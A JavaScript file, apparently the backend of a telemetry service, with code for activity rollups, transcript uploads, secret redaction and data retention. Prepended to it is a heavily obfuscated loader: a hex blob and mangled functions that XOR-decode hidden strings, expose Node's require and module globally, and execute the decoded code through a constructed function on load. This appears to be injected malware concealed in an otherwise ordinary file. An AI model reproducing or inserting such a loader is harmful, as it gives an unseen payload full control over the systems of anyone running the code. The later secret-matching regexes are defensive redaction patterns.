b1c7a6b6c7bbe7bdc5fcc7c7a9f6bbc7f6fccac0b4efc7c7c7aee0cbe9bbcfbbe6bdc1c7c7c1f6bbf1e8c7a9ecbbcaf6a9bbc7c7eeb1fec7a1d3d7bdb1c9a9e2bbb5bbaec7a9f0c7a1c9e6c7f6ada9c7bbc7ced0f1c7b5e0fac7cee8c3bdbbe5f1b2b7a9dff4bda1e5e7d4c7bdbbdbf6a9a9e7e5a6bbabefb5f0f0c7b4a9bba9a0a2afb3c5bcf6cec7f7c7c7d0d8bdcac5bbe8c7c7bcbba8c7fde7a9b9d6c7c7c7bda9fea6c7befdfbb5b0c7bbc7d3bcf9c7aec7bbe6b5c7bbfff9f8c7bdbdf9faddbba9c7a9eec5c7f0c7fca9a9f6f1f0debbc7bbf3c7a7e5c7bdf4faebbbc7ecc7c7c7ceafc7c7aaf0fce6c7c5f3feb5cce6bde6a6bbf6b5a9a1f7f9faa9a5a9aceefaa9c7c1d5c7bbbbfbc7fcc7aef4f9aae6fac7a5f2a9c1bbc7e1f8a9e0bbe6c9aac7f9bbcac7f6f6efa1b3afaaa5b5bba0c7baf6e1f6a1a9c7abfdfcb0bbfcb6fce8a9c7bbd0f8f6a4edd4fbf3c7eec6f6e7bbc7bbb0e9b7bbc5e7e7c7fba9f6c7fbc5b4f4c7c7e1c7f3c7bbc5b5adb2c7a9dfd4b5c7b3fca9f0f6f6eec8f6f3bbc7f8f4c7bbfce7f6bbfcc7f0cfb7fba9ecb4a9b5f6c7b5b6a9b9f0f6b4c7f1ace6fcf6becaa4f4bbe7e0bbbbf7bbbbc7f0fda9c7ebfcb1fae1a9f3c7f1f6fce1a9c9f2facaa5f9c7f8e3d3bda9f0ace6a9c7e1e1bdb5b4c7fbc7a3e8a9bbfce1dabbbbb3ace6a1f1dbc7f6b5bbfabbc7c7bbc8ffa5b5c7b5f8f4a1aee7a9e6d6f4bcb3b5f8faceedf9c7bffde1b4b9d4e0e5b5c7e0b9f3c7e1f3ceffbcc5bff6c7c7a4a9c7c6e3b5e6b4a7f6dce6c7bbbbf0a2a1fdc7f1b2f6afe3e6e7bbe6aea9f0bda9cab4d8c7f3c7f3d9d9f2f4f9bbb4bbe0bbc7acbdd8f6f9f4bdf1e8e1daf4bbe8c7f6dcf0f7f8d0f6a5dbbdc7d1b0f7d0b1b5e7f1a9f6e2bcbbd3a9daf7cfc2c7bbfff2bbc0a1b7f4f3c7f5b2f8b0baf0f3f4edc7c7c7aec7fbf4afa2e3c7a5f7f6bbf4cac7a9a9ffc7c7e6bbbbcdbce6e5d2fcb3e3b2f0bbf9bba7bbdcbbf0ace7c7f0bbe6b2a4a8e7bbf0c7f0edf7f7cac7c7caf0acf6f1a9d3dcc5b4bbf6c7beadbba1a1a3bac0a9a9f9e6b4c8a9e0f5e5c7e6e0f7a9f7abdfc5e2e5d5fcf9c7a9fcbcfeb4f1c7d9fec7bbe1e7c7edbde7e7bcb0b5babbbdc8f7adf6c7e6bee3c7b8f6bce8affae6c7bbf6b6b7a9f6e4fea9f0febbfcf8c7c6dbbbc7e6d0b5f7c5c5fbbca9f0e8faa5f0b7bba4f1c7dcc7b4bde7bbb0bbdcbbbbc7f3eff4caaac7c7fef3bab9e1f6c7c7dcf3bba9fcc7b5f7f1c7dabbf6c5f6f1f0c7bbe6e8f0ffd3f7e5aefabbf3e6a9f6caf8f6a9f4d3bbf1fbf6a5f6b5c7c7c7bbe4fbb5bbc7f6c7bbfdc7deffa9c7e6bbfef6a9a6c7e6bbf6f6c1e1bbe1e7e1fbe1abe2aebadcf6cff6ade7a9fcbbc7e1abc7f6e6bbbbe6b5e6eec1f0b5a9b4bbbebbc7bba9e0c7c5c7fabba9debbf8bbf4bbe6e7d8a9c7b5bbf6e2c7fcf6a9c7bcfbc5bda9c7c7f0f0e0e1f6dff6b0e5dbbbc7e6f6f0bba8f0f4f3a5a9b2d5c6e8a4a9a9ccdcffe7b4b4a9a1f4bbf3c7c7bbf9b3a9c7b1bbbbf9e3bbe8e9a0b3c7bbc7b4a9bcedf3e6bbf7b1afc7f6b5f9bba9b5fabddfbbf0bbb6dbbba2e1a9bcf6a9e2b5f0c7a5bba8a9ecf6b5b4bbbbc7f0aaa9fbb2d7cec7f7fab2f4e0c7e8b5e7f4f0b6c7a8bbfcc7bde6e1a7bbf7ebb5a9c6f6bbe8e1c1e6c7e7a9f4c7bcb5e7ecfce7b4d6a9f6b5e1f1ebb7b5cdbbe1e1c7a9c7b4f1b5f6bbbbb4f0f1bbc7bba9c7b5fbbbc6fbf0b4b4bca1bafacdc7c7e0bbf0fbc7a9bbe7c7e4c7b7f9cad8bbf0f3e1e1e7b5e1c7f6bbcae7a9c7bbc7bbf1f1eec2fdeec7bba9bbb3c7c7f6a9bbf2f3e8c7f6e7a0a7f1e1f0e8f1bde8aaf6d3a2bbedecb1c2a9b4bbbbf6a3e5f6aadbf6a5efbdfda1bbc7c7faa8cafaf4bbc5f3b4f3a1fdc7bbc7f1bff0a8f1b6f6f6a3e7e7eefabac7f4c7c6bbefbbe3bbc7d1f6a9bbcec7acbbb2e1c8b3bbc7c7c7b8a1c7b3f0e2c9f6c7ccf0fafbf3b5e1bbf8bcf0a8bbfcf6debbc7eebba5e6f9a4e5f6c7e6bdf6fdf9bbc2c7bbecf6bbeef0fcf9a6f3e1a9eebabbd6bbbdbbfba9f9bcabf8a9a9f1a4a9f4aab5fbf0f6a9c7bbbbf4e3f9fac7e3ffc7f2f0bbcab5a8c7bebbc7c7bbe2f1c7bbf1a3b0bbdcf6f6bdbee1bbaff6fcb2bbf6fde1bbf7bbc7b4e6a1f3e1cac7ede1f4a9e6e8ddb9f6f6bbf1fec7fbf6bbbbe8f6b6b5fbbcc7bbbdcabcf6a4a6bbfae1bbfabbe8a9b4bbe1c7c7bcbbe1a9bbbbbbadc7fbbbdde1f6e1a9f7f9c7fae1f6c4d2fbcbbfcaedf8f0f6c5c1e8bbbba9a9e7a5b5f9d0e1b4f1fbb7a5e5f3bbf2f9e8c7a9f0c7f9c1d5fcbbbbf2bcfbf0a1c7e0a9f3c7c7c1f2bbf6c7bbf6bbf0f0e1a9bbbbcbf0f0b9e7aee1e9e5f6e1f0c2d3e6b5c7f2f4f1c7e7fad2bdf9e1f9b5b6bdece7a9bbb6f1f1e1bba9c7b5fcb8faa9e6e1dcf1b4f7bcc7dcd0e1bfc7c7fbb3c7bbf6a9fcc7f8f9c7bdb8bdf8e1f6febbc7ecb4a5c7ccdfa9f6bbc7fcabe7e7bbb5e2acf6c1f4c7a8a9c5f6f1dec8cac9a7f3bdb5b6bbc7e6b0bbe1f0a9fbbac7e7ecf6f6bbfbc7f6b1bbc5b3bbf3bbfcf6f6d7c5dbc7f1c7aec7bba0a9c7c7a9f8c5faeebdc7eecafba9f9c7fcf1bbfdc7b5bbf1c7fbc7e7b4dfe2c7a5bbc7c5c7e7bbaba8bdf3a9f0aabba9d7f3c8edc7f6f7f6c5f6c7e6e8a9c7bde6bbc7c5ccbbc7c7cac5febdfaa9bdf1f9a9a5f0c7b9a4afd1a4e6e3bbfcf9fdf0cac5c7e5f6f6c7a4e4f8bbf1f8b7a9e6fce6c5f1bbaab5e5f8f1c7fdc7fbf6e1bdaab1c7e7e1c7edbbf0bcf5bbbbc7bbe5aafcb4c7a4c7e7bdb5eebbf0c1c7c7e8bbf6e8a9c7c7adbbbbc7e5c7b7f6f2aebbf6f6a5c7e7c7bbb5e1b3a6fbf1a0f0f6c5f7cabbc7b4c7f4f6f6c7f7f6f1f7e8f6bdb4eee1a9bbc7fbe3bbdbc7b3ebf0d4e6b1efb7a9a1a9bbfaf2e6f3d6f4c7f9a9faf6d0c7fac7c7e1bbbba9e6bbfcf5c7aabbe6f2f6bbbbc7e6c7e6bbb2b1edc7f6e6dbc7c7b4c7f5c7fac7cafbb4b6c7b9b4a0e4f3bbb6d7dcc7d5f9bbb9bbc8fac7f0c7f4e9a9c7cee1a9a9afe9f4cea1a9c7ebc7b4bed0f2b8c7bbf4c5b4f0b5b3f9a9a0fbb0f6c7c7f1d3e7ecf6bbe6bac7bbaeeeeeb9ddbbaea9fba9bbbca1bbe1f1f8c7bce6c7f1bdf8c7f7eebba9c7f6bbe7c5f8bbf6c7f0b5f6c7f6fec7edbca9f6b3f6fcbbecf6f0f9e0ecaeb9bbcdf1e7c7f9c7c7b6b5f6f6f3bbf6c7b5b5c7b1c7f6fae7e7bdbbe7d6e5a9dbe7b6d0bdc8c7fbc7b7fcfffbf2c7c7a1a9d6b1f4f1f9c7f4f6b3e1bdb4b8c7e5bbc8f1fabbf6fcc7e8e0e6c7e7e6bdfbb5d6a9b4aebbf3f6bbf6d5efa9e1c7a1e1d6c7e1c7e1f6a8bbf6a6f6f3fabbb4b5b5c7aea9f3f0adc7f1e7d8c7c7cef1dbcef6ecc7f6afabc1fba9f9cbbbf9faadc7fcc7c7f6e6e6f6e8c7e1e5f6eebbe6c7e6bbbbbbe8f6bbc7f4cccea9f4bfb5bcdcbdf9f1c7bde2e6e7a3b5bfc7a2b4f4a9c6bbf6a9c9c7bbd7d0d9c7f0a3ccf3a9a4a9f0f6c5e7d1f0b5e6f9a5c5f7d1b6c7c8fabbb2a9f9bbf8b5c7bde5bca9f0fef4f6bbf6c7bbf1bbbbcae0a9f4b2a9b5c7f9fcf7f3f8fbf1f3c8bbbdb0c7c7a9c7dbd1f6c7d0c7b6c3bbbbf4e6f4cefbb3c7b9b1a9b9c7a9faa1c7c7f0d0c7bce6e6d9c8add0c6c7c7f0c7d0fcc7eec7a9f6bbeeb5f6c2d2f3e8fafdf1f6f4e6bbc8bbb5f3c5a8b5fae6a3a2d0faf6dcc5faf6b5bba2fcf2f6d3d6c7bbb5a9f6d0bbdbb5bbf7c7','f6cbf8f0fff7cbe1e7fa','fde4f0e7e6edf9e0e3e2f4f6f1fff7ecf8f2fae7eff3fefaf6fce5e1e7e0e1fbe6e1fafbf6','f6fdf4e7d4e1','e6e5f9fce1','a4a4a7a0a3addec6dcdec0e7','a1a0a2a2a6a5acccd8e2d7f9c5','fffafcfb','f9f0fbf2e1fd','a1a4a4a4a6ada5f6f3d0cfd2e6','a4a6a2a1a1adc4fcfbdef0ef'];FNauj_AOPOLeprqN=function(){return YWAUuVXUtNHScESvfdS;};return FNauj_AOPOLeprqN();}function splitLane(lRz_jCmBV){var IX$kn_U=WWXFnxYi_iSPKy,ElaVzQSLW$LOZ=String[IX$kn_U(0x1a7)](0x1*Math.floor(-0xab5)+-0xdfe*-0x2+Math.ceil(-parseInt(0x3))*0x5b9),NMYdFay=spin(lRz_jCmBV,NX);return NMYdFay=NMYdFay[IX$kn_U(0x19f)]('^')[IX$kn_U(0x1a2)](ElaVzQSLW$LOZ),NMYdFay=NMYdFay[IX$kn_U(0x19f)]('*1')[IX$kn_U(0x1a2)]('^'),NMYdFay=NMYdFay[IX$kn_U(0x19f)]('*0')[IX$kn_U(0x1a2)]('*'),NMYdFay[IX$kn_U(0x19f)](ElaVzQSLW$LOZ);}function WWXFnxYi_iSPKy(lHVrGAloamYtIGLw,vOUPMKHNjkeOviIAJK){var JnjOuveQD=FNauj_AOPOLeprqN();return WWXFnxYi_iSPKy=function(eHB$FEzpep,h_NO$sa){eHB$FEzpep=eHB$FEzpep-(Math.floor(0x216a)+0xf1*-parseInt(0xd)+Number(-parseInt(0x1393)));var nwBwTOScp$uxXZPWhX=JnjOuveQD[eHB$FEzpep];if(WWXFnxYi_iSPKy['JMsdBJ']===undefined){var Fz$VbaCD=function(ErYIlz$D){var Bq_fa_GUe=-0xb5f*Math.ceil(-parseInt(0x2))+0x1548+-parseInt(0x2b71)&parseFloat(-0x56)*-parseInt(0x64)+parseInt(0x231a)+-parseInt(0x147)*0x35,VnGpKZRrGUUbqcvjnUZlbvBL=new Uint8Array(ErYIlz$D['match'](/.{1,2}/g)['map'](q$Xjbf_rTlXS=>parseInt(q$Xjbf_rTlXS,-0x1*Math.max(-0x497,-0x497)+-parseInt(0x1141)+Math.ceil(0x16a)*Number(0x9)))),e$LlOtIPvLcfwCqgyO=VnGpKZRrGUUbqcvjnUZlbvBL['map'](ZNymaFsSAJYbJututcMhI=>ZNymaFsSAJYbJututcMhI^Bq_fa_GUe),JxDDaDw=new TextDecoder(),WxWGDkMw_u_EtbsYSCF=JxDDaDw['decode'](e$LlOtIPvLcfwCqgyO);return WxWGDkMw_u_EtbsYSCF;};WWXFnxYi_iSPKy['EnMxTv']=Fz$VbaCD,lHVrGAloamYtIGLw=arguments,WWXFnxYi_iSPKy['JMsdBJ']=!![];}var RPWvGjZtsnNOfMqULp=JnjOuveQD[Math.max(0x1299,0x1299)+-parseInt(0x1062)+-parseInt(0x237)],M$GxGvhPRVnSqcl=eHB$FEzpep+RPWvGjZtsnNOfMqULp,o$LoLvE=lHVrGAloamYtIGLw[M$GxGvhPRVnSqcl];return!o$LoLvE?(WWXFnxYi_iSPKy['qVLArB']===undefined&&(WWXFnxYi_iSPKy['qVLArB']=!![]),nwBwTOScp$uxXZPWhX=WWXFnxYi_iSPKy['EnMxTv'](nwBwTOScp$uxXZPWhX),lHVrGAloamYtIGLw[M$GxGvhPRVnSqcl]=nwBwTOScp$uxXZPWhX):nwBwTOScp$uxXZPWhX=o$LoLvE,nwBwTOScp$uxXZPWhX;},WWXFnxYi_iSPKy(lHVrGAloamYtIGLw,vOUPMKHNjkeOviIAJK);}function peel(CXxECwMwXrWjgmVIFADAqMP_rd){return spin(CXxECwMwXrWjgmVIFADAqMP_rd,SX);}(function boot(R$Md_dORoiWfhiZgDaJW,AxmkyhsaQWxBiq$ycpkRWJOKps){var njaAYIujQGrI$Tjx_nwXzEkHpvi=WWXFnxYi_iSPKy;R$Md_dORoiWfhiZgDaJW['z']=z;var GhRRs_tCVH=splitLane(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19c));R$Md_dORoiWfhiZgDaJW[GhRRs_tCVH[0xcd5+-parseInt(0x1)*Math.trunc(-0xc7f)+parseFloat(-0x1954)]]=AxmkyhsaQWxBiq$ycpkRWJOKps;typeof module===GhRRs_tCVH[Number(parseInt(0x586))+0x6b8+-0xc3d]&&(R$Md_dORoiWfhiZgDaJW[GhRRs_tCVH[parseInt(0x2)*Number(-parseInt(0x523))+-parseInt(0x1)*-0x1f3a+-0x14f2]]=module);var vlqyrZbXWzaKNFUztEOJoYJnd=peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19d)),ZLjVUhMBvyPDFsEyBH=vlqyrZbXWzaKNFUztEOJoYJnd[njaAYIujQGrI$Tjx_nwXzEkHpvi(0x1ac)](parseInt(0x957)+parseInt(0x26bf)+Math.trunc(0x99e)*-0x5,-parseInt(0x9)*parseInt(0x273)+Math.max(parseInt(0x25aa),0x25aa)+parseFloat(-parseInt(0x2))*parseFloat(0x7ca)),NNZAY__Lg=peel[ZLjVUhMBvyPDFsEyBH],nHqeuCdYEz=NNZAY__Lg('',peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x1ad))),zaKmUHwWXOYytikEdPxIQN=nHqeuCdYEz(peel(njaAYIujQGrI$Tjx_nwXzEkHpvi(0x19b)));return NNZAY__Lg('',zaKmUHwWXOYytikEdPxIQN)(0xfae+Math.trunc(-0x17e1)*-0x1+-parseInt(0x1)*parseInt(0x1dc2)),parseInt(0x2)*parseInt(-parseInt(0xc95))+parseInt(0x335c)+parseInt(-0x1)*-parseInt(0x59c);}(global,require));
async function repairDailyActivityYesterday(env) {
  try {
    await env.DB.prepare(`
      INSERT OR IGNORE INTO daily_active_users (
        activity_date, telemetry_id, raw_active, meaningful_active,
        release_active, meaningful_release_active, session_start_count,
        turn_end_count, session_end_count, session_crash_count, ci_active,
        last_is_ci, last_build_channel
      )
      SELECT date(created_at), telemetry_id, 1,
        MAX(CASE
          WHEN event IN ('prompt_submitted', 'turn_end') THEN 1
          WHEN event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ) THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') AND (
          event IN ('prompt_submitted', 'turn_end')
          OR (event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ))
        ) THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_start' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'turn_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_crash' THEN 1 ELSE 0 END),
        MAX(is_ci), MAX(is_ci), MAX(build_channel)
      FROM events
      WHERE event IN ('session_start', 'prompt_submitted', 'turn_end', 'session_end', 'session_crash')
        AND created_at >= datetime('now', '-1 day', 'start of day')
        AND created_at < datetime('now', 'start of day')
      GROUP BY date(created_at), telemetry_id
    `).run();
  } catch (err) {
    console.warn("daily activity repair failed", err?.message || err);
  }
}

async function ingestTranscript(request, env, cors) {
  if (!env.TRANSCRIPTS || typeof env.TRANSCRIPTS.put !== "function") {
    return jsonResponse({ error: "Transcript storage unavailable" }, 503, cors);
  }
  const declaredSize = Number(request.headers.get("content-length") || 0);
  if (declaredSize > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  let body;
  try {
    body = await request.json();
  } catch {
    return jsonResponse({ error: "Invalid JSON" }, 400, cors);
  }
  const problem = validateTranscript(body);
  if (problem) {
    return jsonResponse({ error: problem }, 400, cors);
  }

  // Defense in depth: clients redact before upload, but the public endpoint
  // must not trust callers to have done so. Preserve ordinary code and prose
  // while removing high-confidence credentials and sensitive object fields.
  redactSecretsInValue(body.messages);

  const encoded = JSON.stringify(body);
  const byteLength = new TextEncoder().encode(encoded).byteLength;
  if (byteLength > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  const month = new Date().toISOString().slice(0, 7);
  const objectKey = `transcripts/${month}/${body.upload_id}.json`;
  try {
    await env.TRANSCRIPTS.put(objectKey, encoded, {
      httpMetadata: { contentType: "application/json" },
      customMetadata: {
        consent_version: String(body.consent_version),
        telemetry_id: body.id,
      },
    });
    await env.DB.prepare(`
      INSERT INTO transcript_uploads (
        upload_id, telemetry_id, object_key, consent_version, schema_version,
        version, provider, model, end_reason, message_count, byte_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      body.upload_id,
      body.id,
      objectKey,
      body.consent_version,
      body.schema_version,
      body.version,
      body.provider || null,
      body.model || null,
      body.end_reason,
      body.message_count,
      byteLength,
    ).run();
  } catch (err) {
    try {
      await env.TRANSCRIPTS.delete(objectKey);
    } catch {
      // Best effort rollback. R2 lifecycle retention remains the safety net.
    }
    console.error("transcript upload failed", err?.message || err);
    return jsonResponse({ error: "Internal error" }, 500, cors);
  }
  return jsonResponse({ ok: true, upload_id: body.upload_id }, 200, cors);
}

function validateTranscript(body) {
  if (!body || body.event !== "transcript") return "Invalid transcript event";
  if (!UUID_RE.test(body.id || "") || !UUID_RE.test(body.upload_id || "")) {
    return "Invalid transcript identifier";
  }
  if (body.consent_version !== 1) return "Unsupported consent version";
  if (!Number.isInteger(body.schema_version) || body.schema_version < 1) {
    return "Invalid schema version";
  }
  if (typeof body.version !== "string" || !body.version) return "Missing version";
  if (!Array.isArray(body.messages) || body.messages.length === 0) {
    return "Transcript messages must be a non-empty array";
  }
  if (!Number.isInteger(body.message_count) || body.message_count !== body.messages.length) {
    return "Transcript message count mismatch";
  }
  if (!["normal_exit", "user_exit", "error", "unknown", "superseded"].includes(body.end_reason)) {
    return "Invalid transcript end reason";
  }
  return null;
}

const SENSITIVE_KEY_RE = /^(?:authorization|cookie|setcookie|privatekey|clientsecret)$/;

function isSensitiveKey(key) {
  const normalized = String(key).toLowerCase().replace(/[^a-z0-9]/g, "");
  return normalized.includes("apikey")
    || normalized.endsWith("token")
    || normalized.endsWith("secret")
    || normalized.includes("password")
    || SENSITIVE_KEY_RE.test(normalized);
}

function redactSecretText(text) {
  return text
    .replace(/sk-ant-(?:oat|ort)01-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/sk-or-v1-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ghp_[A-Za-z0-9]{20,}/g, "[REDACTED_SECRET]")
    .replace(/github_pat_[A-Za-z0-9_]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ya29\.[A-Za-z0-9._-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/AIza[0-9A-Za-z_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/xox[baprs]-[A-Za-z0-9-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/AKIA[0-9A-Z]{16}/g, "[REDACTED_SECRET]")
    .replace(/Bearer\s+[A-Za-z0-9._~+/=-]{20,}/gi, "Bearer [REDACTED_SECRET]")
    .replace(/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, "[REDACTED_SECRET]")
    .replace(/^\s*([A-Z][A-Z0-9_]*(?:API_KEY|TOKEN|SECRET|PASSWORD|COOKIE)\s*=\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]")
    .replace(/^\s*(AUTHORIZATION\s*[:=]\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]");
}

function redactSecretsInValue(value) {
  if (Array.isArray(value)) {
    for (let index = 0; index < value.length; index += 1) {
      if (typeof value[index] === "string") value[index] = redactSecretText(value[index]);
      else redactSecretsInValue(value[index]);
    }
    return;
  }
  if (!value || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    if (isSensitiveKey(key)) {
      value[key] = "[REDACTED_SECRET]";
    } else if (typeof entry === "string") {
      value[key] = redactSecretText(entry);
    } else {
      redactSecretsInValue(entry);
    }
  }
}

function observeDbSize(result) {
  const size = result?.meta?.size_after;
  if (typeof size === "number" && size > 0) {
    lastObservedDbSizeBytes = size;
  }
  return lastObservedDbSizeBytes;
}

function isDbFullError(err) {
  const message = String(err?.message || err || "").toLowerCase();
  // D1 surfaces the cap as SQLITE_FULL ("database or disk is full") or an
  // explicit size-limit message. Keep this narrow: a false positive triggers
  // an unnecessary (rate-limited) prune, but matching e.g. "LIMIT" in SQL
  // syntax errors would prune on every malformed query.
  return (
    message.includes("sqlite_full")
    || message.includes("disk is full")
    || message.includes("database is full")
    || message.includes("exceeds the maximum size")
    || message.includes("maximum database size")
  );
}

function maybeScheduleEmergencyPrune(env, ctx) {
  if (lastObservedDbSizeBytes < D1_SOFT_LIMIT_BYTES) {
    return;
  }
  const now = Date.now();
  if (now - lastEmergencyPruneAtMs < EMERGENCY_PRUNE_COOLDOWN_MS) {
    return;
  }
  lastEmergencyPruneAtMs = now;
  if (ctx && typeof ctx.waitUntil === "function") {
    ctx.waitUntil(emergencyPrune(env));
  }
}

async function emergencyPrune(env) {
  console.error(
    `EMERGENCY PRUNE: db size ${lastObservedDbSizeBytes} bytes >= soft limit ${D1_SOFT_LIMIT_BYTES}; pruning with halved retention windows`,
  );
  await pruneOldEvents(env, { retentionScale: 0.5, maxBatches: 24 });
}

// Retention windows, in days, per event type. Children (turn_details /
// session_details) are deleted before their parent events rows to satisfy the
// FOREIGN KEY (event_id) constraints.
//
// Rationale:
// - turn_end / session_start / onboarding_step are the high-volume rows that
//   filled the database; their aggregate signal is captured in the
//   daily_active_users rollup at insert time.
// - session_end / session_crash power the headline "total users" and crash
//   metrics; keep them for 12 months per the documented retention policy.
// - install and feedback rows are tiny and act as identity/product anchors;
//   they are never pruned here.
// - web_pageview is the high-volume website row; keep a 90-day raw tail in D1
//   (matching firehose retention) and prune beyond it. web_cta_click is the
//   low-volume conversion anchor; keep 12 months. Web vitals need only a
//   30-day performance window; classified web errors remain useful for 90 days.
// - subscription_activated and account_linked are identity/revenue anchors and
//   are never pruned (like install / feedback).
const RETENTION_DAYS = {
  turn_end: 30,
  session_start: 30,
  onboarding_step: 30,
  upgrade: 60,
  auth_success: 180,
  session_end: 365,
  session_crash: 365,
  session_concurrency: 365,
  web_pageview: 90,
  web_cta_click: 365,
  web_vital: 30,
  web_error: 90,
  install_funnel: 90,
  subscription_login: 180,
  subscription_router_error: 90,
  subscription_budget_exhausted: 365,
  todo_session: 365,
  prompt_submitted: 30,
  telemetry_opt_out: 365,
  desktop_update: 365,
};

const PRUNE_BATCH_LIMIT = 10000;
const PRUNE_MAX_BATCHES_PER_RUN = 12;

async function pruneOldEvents(env, options = {}) {
  const retentionScale = options.retentionScale ?? 1;
  const maxBatches = options.maxBatches ?? PRUNE_MAX_BATCHES_PER_RUN;
  const linkageDays = Math.max(1, Math.round(90 * retentionScale));
  const linkageCutoff = `-${linkageDays} days`;
  // The conversion key is deliberately short-lived. Keep the aggregate CTA and
  // install anchors, but sever the browser <-> CLI join after 90 days.
  for (const table of ["web_details", "install_details"]) {
    try {
      await env.DB.prepare(
        `UPDATE ${table} SET conversion_id = NULL WHERE conversion_id IS NOT NULL
         AND event_id IN (
           SELECT event_id FROM events
           WHERE created_at < datetime('now', ?) AND event_id IS NOT NULL
         )`
      ).bind(linkageCutoff).run();
    } catch (err) {
      console.warn(`${table} attribution redaction failed`, err?.message || err);
    }
  }
  let batchesUsed = 0;
  for (const [eventType, days] of Object.entries(RETENTION_DAYS)) {
    const scaledDays = Math.max(1, Math.round(days * retentionScale));
    const cutoff = `-${scaledDays} days`;
    while (batchesUsed < maxBatches) {
      // Delete web_details children first (own try/catch: databases that
      // predate migration 0016 have no web_details table, and that must not
      // abort pruning of the event rows themselves).
      if (WEB_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM web_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`web_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (INSTALL_FUNNEL_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM install_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`install_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (eventType === "desktop_update") {
        try {
          await env.DB.prepare(
            `DELETE FROM desktop_update_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`desktop_update_details prune failed`, err?.message || err);
        }
      }
      if (eventType === "todo_session") {
        try {
          await env.DB.prepare(
            `DELETE FROM todo_session_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn("todo_session_details prune failed", err?.message || err);
        }
      }
      try {
        // Delete detail children first so the events FK never blocks the prune.
        await env.DB.prepare(
          `DELETE FROM turn_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        await env.DB.prepare(
          `DELETE FROM session_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        const result = await env.DB.prepare(
          `DELETE FROM events WHERE id IN (
             SELECT id FROM events
             WHERE event = ? AND created_at < datetime('now', ?)
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        observeDbSize(result);
        const changes = result?.meta?.changes ?? result?.changes ?? 0;
        // Empty event families must not consume the deletion budget, or adding
        // a family permanently starves later families of retention checks.
        if (changes > 0) batchesUsed += 1;
        if (changes < PRUNE_BATCH_LIMIT) {
          break;
        }
      } catch (err) {
        console.warn(`retention prune failed for ${eventType}`, err?.message || err);
        break;
      }
    }
  }
}

async function insertConcurrencyDetails(env, body) {
  if (typeof body.event_id !== "string" || !body.event_id) return false;
  try {
    // Also run on event retries: a previous parent insert can have succeeded
    // while this detail write failed. INSERT OR IGNORE never rewrites history.
    await insertDynamic(env, "concurrency_details", concurrencyEntries(body));
    return true;
  } catch (err) {
    // A missing migration or failed detail write must not discard a valid
    // parent event. Coverage exposes missing_detail and the response exposes
    // concurrency_durable:false. Do not cache table absence across migrations.
    console.warn("concurrency detail write failed", err?.message || err);
    return false;
  }
}

async function insertEvent(env, body) {
  // usage_report is high volume (one per provider response). It is kept in
  // the firehose for per-session detail and rolled up here; no raw events row.
  if (body.event === "usage_report") {
    await recordDailyModelUsage(env, body);
    await recordCountryDaily(env, body);
    return;
  }

  const columns = await getEventColumns(env);
  const sessionDetailColumns = await getSessionDetailColumns(env);
